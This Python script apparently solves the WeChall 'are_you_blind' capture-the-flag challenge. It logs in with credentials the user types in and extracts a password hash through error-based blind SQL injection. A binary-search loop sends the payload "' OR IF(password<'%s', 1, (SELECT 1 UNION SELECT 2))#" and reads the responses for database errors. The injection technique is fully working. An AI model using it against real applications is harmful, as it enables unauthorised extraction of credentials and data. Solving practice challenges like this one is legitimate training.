#!/usr/bin/env python3

import wechall
from sys import stderr
from getpass import getpass
import re

url = 'http://www.wechall.net/en/challenge/Mawekl/are_you_blind/index.php'

inj = "' OR IF(password<'%s', 1, (SELECT 1 UNION SELECT 2))#"
def inject(user):
    low  = 0x000000000000000000000000000000000
    high = 0x100000000000000000000000000000000
    guess = low + high >> 1
    while low + 1 < high:
        res = user.post(url, {
            'injection': inj % hex(guess)[2:],
            'inject': 'Inject',
        }).text
        less = res.find('Database error') == -1
        # Something wrong, it's not accurate to count it myself
        attempt = re.search(r'(\d{1,3})\.? attempt', res).group(1)
        print('\r{:02x}: {}'.format(int(attempt), hex(guess)[2:]))
        if less:
            high = guess
        else:
            low = guess
        guess = high + low >> 1
    return hex(guess)[2:].upper()

if __name__ == '__main__':
    stderr.write('Your username: ')
    username = input()
    password = getpass('Your password: ')
    user = wechall.login(username, password)
    user.get(url + '?reset=me').text
    counter = 0
    while counter != 3:
        solution = inject(user)
        res = user.post(url, {
            'thehash': solution,
            'mybutton': 'Enter',
        }).text
        if res.find('correct') != -1:
            print('Correct')
            counter += 1
        else:
            print('Something wrong, retry')
            counter = 0
################################################################################
#        with open(str(counter) + '.html', 'w') as f:
#            f.write(res)
################################################################################

